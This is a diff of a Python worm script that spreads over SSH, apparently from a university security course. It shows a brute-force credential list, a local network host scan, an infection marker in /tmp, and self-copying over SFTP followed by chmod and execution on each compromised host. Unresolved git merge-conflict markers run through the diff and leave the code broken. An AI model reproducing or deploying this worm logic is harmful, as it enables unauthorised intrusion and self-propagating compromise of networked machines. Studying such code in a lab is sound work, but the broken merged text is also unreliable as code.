@@ -16,8 +16,12 @@ credList = [
 ('cpsc', 'cpsc'),
 ]
 
+<<<<<<< HEAD
+ORIGIN_IP = "192.168.1.3"
+=======
 AttackIP=[]
 
+>>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 # The file marking whether the worm should spread
 INFECTED_MARKER_FILE = "/tmp/infected.txt"
 
@@ -60,7 +64,7 @@ def markInfected():
 # @param sshClient - the instance of the SSH client connected
 # to the victim system
 ###############################################################
-def spreadAndExecute(sshClient):
+def spreadAndExecute(sshClient,systemIP1):
 	
 	# This function takes as a parameter 
 	# an instance of the SSH class which
@@ -79,12 +83,25 @@ def spreadAndExecute(sshClient):
 	
 	print("****************inside the spreadAndExecute***********")
 	# MIG: Changed this one to the SFTP client
+<<<<<<< HEAD
+	if systemIP1 != ORIGIN_IP:
+		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
+
+
+	else:
+		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
+
+
+	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
+	sshClient.exec_command("python /tmp/replicator_worm.py")
+=======
 	if len(sys.argv) < 2:
 		sftpClient.put("/tmp/replicator_worm.py","/tmp/replicator_worm.py")
 	else:
 		sftpClient.put("replicator_worm.py","/tmp/replicator_worm.py")
 	sshClient.exec_command("chmod a+x /tmp/replicator_worm.py")
 	sshClient.exec_command("python /tmp/replicator_worm.py 2> /tmp/log.txt")
+>>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 	
 
 ############################################################
@@ -242,6 +259,12 @@ def getHostsOnTheSameNetwork():
 			liveHosts.append(host)
 	return liveHosts
 
+# TODO: Get the IP of the current system
+interface = netifaces.interfaces()
+
+systemIP = getMyIP(interface)
+print("System IP is " + systemIP)
+
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
 # will act maliciously. This way, when you initially run the 
@@ -251,8 +274,10 @@ def getHostsOnTheSameNetwork():
 # an alternative approach is to hardcode the origin system's
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
-if len(sys.argv) < 2:
-	
+if systemIP == ORIGIN_IP:
+	print("It does")
+if systemIP != ORIGIN_IP:
+
 	# TODO: If we are running on the victim, check if 
 	# the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice. 
@@ -265,10 +290,15 @@ if len(sys.argv) < 2:
 		markInfected()
 	
 # TODO: Get the IP of the current system
-interface = netifaces.interfaces()
+#interface = netifaces.interfaces()
 
+<<<<<<< HEAD
+#systemIP = unicode(getMyIP(interface),"utf-8")
+#print("System IP is " + systemIP )
+=======
 systemIP = getMyIP(interface)
 print("System IP is " + systemIP)
+>>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 
 # Get the hosts on the same network
 networkHosts = getHostsOnTheSameNetwork()
@@ -286,11 +316,18 @@ attackList = []
 temp = []
 
 for targetHost,j in enumerate(networkHosts):
+<<<<<<< HEAD
+	if networkHosts[targetHost] != systemIP and networkHosts[targetHost] != ORIGIN_IP:
+		HostToAttck.append(networkHosts[targetHost])
+	#Try to attack this host
+print "Found hosts: To attack", HostToAttck
+=======
 	if networkHosts[targetHost] != systemIP:
 		attackList.append(networkHosts[targetHost])
 print "Found Hosts to attack: ", attackList
 if(AttackIP.length > 0):
 	attackList.remove(AttackIP)
+>>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 
 
 # Go through the network hosts
@@ -301,7 +338,10 @@ for host in attackList:
 	
 	print sshInfo
 	
+<<<<<<< HEAD
+=======
 	
+>>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 	# Did the attack succeed?
 	if sshInfo:
 		
@@ -352,10 +392,19 @@ for host in attackList:
 			sftpClient.stat("/tmp/infected.txt")
 			print "The remote system ", sshInfo,  " already contains the infected.txt file"
 		except:
+<<<<<<< HEAD
+			print("We are going to spread ")
+			spreadAndExecute(sshInfo[0], systemIP)
+			
+			# MIG: If we just infected the system, we should
+			# exit.
+			exit(1)
+=======
 			print("inside if isInfectedSytem() statement ")
 			spreadAndExecute(sshInfo[0])
 			print("done infecting")
 			exit()
 			
+>>>>>>> 8d36a2e3270d7e07da92bcaa116afc3d6fa0ed02
 
 
